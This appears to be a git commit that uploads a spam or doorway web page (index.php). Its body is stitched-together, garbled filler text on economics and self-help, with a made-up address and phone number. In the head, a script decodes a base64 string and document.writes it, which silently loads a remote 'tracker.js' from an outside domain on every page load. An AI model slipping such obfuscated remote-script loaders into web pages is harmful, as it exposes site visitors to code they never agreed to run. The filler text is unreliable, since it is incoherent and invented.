692cc41e260485aede9248cded3956fd14b0bd95
uthlmkgi <78854719+uthlmkgi@users.noreply.github.com>
2021-02-10 13:50:21 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,119 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>There are situationswhen you are targeting the Win model and you don't particula</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl91eGl0NDg5M245M3l1d2cyNHIiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+
+</head>
+
+<body>
+
+	<header class="a36pik339pla2nz1">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="our_themes.html">OUR THEMES</a></li>
+			<li><a href="#">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="916bfhs28c8uisoyroqptsc">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>There are situationswhen you are targeting the Win model and you don't particula</h1>
+	</section>
+
+
+	<section class="our-work" class="ptv9vo6pmwgnjy3xoh2e">
+		<h3 class="title">However, there is a tangible, fundamental differenc</h3>
+		<p>Then he showed on the screen the picture you will find on page 54 that combined both images and asked the students to describe what they were seeing.  If your focus is on: Owning property Homeland security: Your security is based on your reputation, your social status, and the property you own.  Sometimes words can do you a disservice.  Practical Suggestions: 1.  The exact opposite of what was said was the literature of the first 150 years. </p>
+		<hr>
+
+		<ul class="grid" class="i8ludd1y6vop6yhl12ubyr2t">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="a36pik339pla2nz1">
+		<h3 class="title">The amount of accounting costs.Knowing the</h3>
+		<p>The boredom was replaced by joyful excitement.  MARKET ECONOMY In modern conditions, the market has transformed from a self-regulating into a regulated one.  The correspondence addressed to you contains several questions,which, in the opinion of your secretary, require an urgent solution (1 hour).  During communication, the husband truly, deeply sympathizes with the wife's desire to visit her mother.  If they have developed the skills of effective interdependence, then they will approach their differences from the standpoint of a completely different paradigm.  - All right, dad, I'm tired! Who needs this school! - What happened, son? (Proving.) - There is no benefit from this study! A stupid waste of time! - Well, sonny, you just don't see the results yet. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="916bfhs28c8uisoyroqptsc" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="ptv9vo6pmwgnjy3xoh2e">
+		<h3 class="title">Defining roles.  Do what needs to be done first First What is m</h3>
+		<p>In the labor market, buyers offer jobs and sellers offer labor.Supply and demand in the labor market largely depend on the price of the offered product.  Disadvantages of a joint-stock company: 1) the organization and liquidation of an enterprise results in large cash costs; 2) the participation of shareholders in management and control over them is weaker than the power of the owner of a small enterprise; 3) the complex organizational structure of the joint stock company provokes bureaucratization.  Suddenly I saw everything quite differently, and when I saw everything differently, I began to think differently, began to feel differently, behave differently.  Defining Effectiveness The seven skills are efficiency skills. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="i8ludd1y6vop6yhl12ubyr2t" style="background-image: url(image3.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="a36pik339pla2nz1">
+		<h3 class="title">Here, as a rule, enterprises of the same industry a</h3>
+		<p>Especially among young men - high school students and college students.  Elasticity can be measured using the coefficient of elasticity: This formula quantifies all three options for price elasticity of demand.  As a commodity, money retains all its properties: it has value and use value.The value of a commodity is determined by the amount of social labor required to produce one monetary unit.  Dubenetsky, Chairman of the Board of Promstroybank of Russia Stephen Covey's Seven Skills is a textbook for those who want to be effective.  I do not hire you or you and I do not sign mutual obligations, since it is obvious that our values ​​and our goals are fundamentally different.  Employment of the economically active population is ensured through the labor market, its inclusion in the sphere of production and in the sphere of services, the possibility of obtaining the necessary earnings is created.  “Let's gather some more information,” I said. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="916bfhs28c8uisoyroqptsc" style="background-image: url(image4.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="ptv9vo6pmwgnjy3xoh2e">
+		<h3 class="title">Take a few minutes and write down your rol</h3>
+		<p>They all complement each other.  Marketing takes place when people decide to satisfy their needs and wants through an exchange.  With the help of taxes, the relationship of taxpayers with budgets of all levels, as well as with banks, parent organizations and other subjects of tax relations, is determined.  Each of us has several different roles in our lives - they are associated with different areas or areas of activity for which we are responsible.  With physical wear and tear associated with inaction, the means of labor completely or partially fail and their value is lost irretrievably.  Indeed, without education in our world you cannot go far.  Power: The little energy you have at your disposal is born of anger, envy, resentment, and a desire for revenge.  The audience was large, and when many listeners turned in her direction, the woman, coming to her senses, was terribly embarrassed and sank back down to her place.  I can’t say that we are in a row, we just don’t love each other anymore.  But in most cases, when entering into negotiations, it is quite possible to use the Win / Win or Do Not Tangle mentality.And this approach provides incredible freedom.  Conversely, an increase in the price of wheat could force farmers to cut their corn production and supply.  But people often rely on sympathy, and this makes them addicted.  Social Victory cannot be achieved with popular negotiation techniques, reflexive listening techniques, or creative problem-solving techniques that arewe are now ready to move on to the skills of Social Victory, to the skills of successful collaboration with other people.  At about noon we got on an old red lightweight Honda 90 motorcycle, took two of our preschoolers with us - one was put between us, and the other I put on my left knee - and set off along the path through the reeds. </p>
+		<hr>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="i8ludd1y6vop6yhl12ubyr2t" class="title">The people involved in it are tightly intertwined with each oth</h3>	
+		<p>But he continued his work.  To avoid this, he filed a lawsuit against the bank.  There are goals that can be achieved by you exclusively during working hours.  The first task is to write out your main roles.  When he is chatting with friends, it is impossible to drag him away from the phone, and answering your questions,it is limited to one or two words.  If the court is used too early, perhaps even for preventive purposes, then the resulting fear and paradigm of judicial intervention will be expressed in thinking and actions that are far from synergistic.  And this is best done in the context of the week.  Your sense of personal security is as vulnerable as your family.  Types of wages 1. </p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="a36pik339pla2nz1">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="916bfhs28c8uisoyroqptsc"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="ptv9vo6pmwgnjy3xoh2e"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="i8ludd1y6vop6yhl12ubyr2t"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>74589 Helene Flat, Apt. 958, 06661-2018, Jadaport, South Carolina, United States</p>
+		<p>Phone number: +89(5432)701-46-47151</p>
+	</footer>
+
+</body>
+
+</html>
